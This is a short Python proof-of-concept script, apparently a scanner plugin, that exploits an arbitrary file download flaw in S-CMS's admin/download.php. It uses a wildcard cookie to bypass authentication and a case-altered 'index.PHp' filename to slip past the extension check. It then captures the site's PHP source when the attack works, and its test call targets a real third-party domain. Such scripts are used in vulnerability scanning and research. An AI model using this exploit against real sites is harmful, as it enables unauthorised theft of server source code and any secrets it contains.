#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


'''
https://xz.aliyun.com/t/3614
'''
import re

def info(data=None):
    info = {
        "name": "s-cms download",
        "info": "s-cms download",
        "level": "high",
        "type": "download",
    }
    return info


def prove(data):
    data = init(data, 'scms')
    if data['base_url']:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4",
            "Cookie": "user=%;pass=%;"
                   }
        for path in [""]:
            poc = "index.Php"
            url = data['base_url'] + path +"admin/download.php?DownName=%s" % poc.replace("h","H")
            res = curl('get',url,headers = headers)
            if res != None and '<?php' in res.text:
                data['flag'] = 1
                data['data'].append({"url": url})
                data['res'].append({"info": url, "key": "s-cms download", 'connect': res.text})
                return data
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))